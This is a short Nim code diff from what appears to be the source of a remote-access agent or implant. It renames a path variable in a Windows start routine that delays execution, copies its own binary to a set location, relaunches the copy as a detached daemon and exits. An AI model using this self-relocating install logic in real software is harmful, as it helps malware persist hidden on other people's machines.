@@ -575,11 +575,11 @@ proc is_elevated(): string =
 proc windows_start*(): void =
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
-    if is_exe and (binary_path != agent_execution_path):
-        var agent_execution_dir = splitFile(agent_execution_path)[0]
+    if is_exe and (binary_path != agent_execution_path_windows):
+        var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
         createDir(agent_execution_dir)
-        copyFile(binary_path, agent_execution_path)
-        discard startProcess(agent_execution_path, options={poDaemon})
+        copyFile(binary_path, agent_execution_path_windows)
+        discard startProcess(agent_execution_path_windows, options={poDaemon})
         ExitProcess(0)
 
 
